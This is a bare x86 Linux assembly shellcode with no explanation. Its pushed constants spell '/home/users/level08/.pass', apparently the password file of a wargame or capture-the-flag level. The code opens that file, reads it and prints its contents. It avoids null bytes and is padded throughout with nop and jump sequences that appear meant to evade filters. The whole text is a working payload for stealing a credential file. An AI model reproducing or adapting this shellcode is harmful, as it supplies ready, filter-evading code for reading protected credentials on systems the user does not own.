global _start

section .data

_start:
  xor ecx, ecx
  mul ecx

open:
  mov al, 0x05
  jmp $+6
  nop
  nop
  nop
  nop


  mov ebx, 0xFFFFFF8D ; inversed to avoid null bytes
  nop
  jmp $+6
  nop
  nop
  nop
  nop

  neg ebx
  push ebx
  nop
  nop
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  push 0x7361702E
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  push 0x2F38306C
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  push 0x6576656C
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  push 0x2F737265
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  push 0x73752F65
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  push 0x6D6F682F
  nop
  jmp $+6
  nop
  nop
  nop
  nop
  mov ebx, esp
  int 0x80

read:
  xchg eax, ebx
  xchg eax, ecx
  jmp $+6
  nop
  nop
  nop
  nop
  mov al, 0x03
  mov dx, 0x0FFF
  jmp $+6
  nop
  nop
  nop
  nop
  inc edx
  int 0x80

write:
  xchg eax, edx
  mov bl, 0x01
  jmp $+6
  nop
  nop
  nop
  nop
  shr eax, 0x0A

  int 0x80
  nop
  jmp $+6
  nop
  nop
  nop
  nop

exit:
  xchg eax, ebx
  int 0x80
  nop